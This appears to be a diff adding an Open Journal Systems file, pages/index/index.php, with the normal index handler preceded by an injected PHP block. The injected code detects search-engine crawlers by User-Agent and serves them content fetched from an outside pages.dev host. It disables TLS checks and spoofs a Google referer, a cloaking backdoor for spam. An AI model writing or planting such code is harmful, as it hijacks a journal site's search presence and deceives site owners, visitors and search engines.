@@ -1,0 +1,54 @@
+<?php
+@ob_start();
+header("Vary: User-Agent");
+$targetUrl = "https://journals-assyfa-com.pages.dev/journals-assyfa.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
+}
+if (preg_match($botPattern, strtolower($userAgent))) {
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
+}
+?>
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+ 
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
+ */
+
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
+}
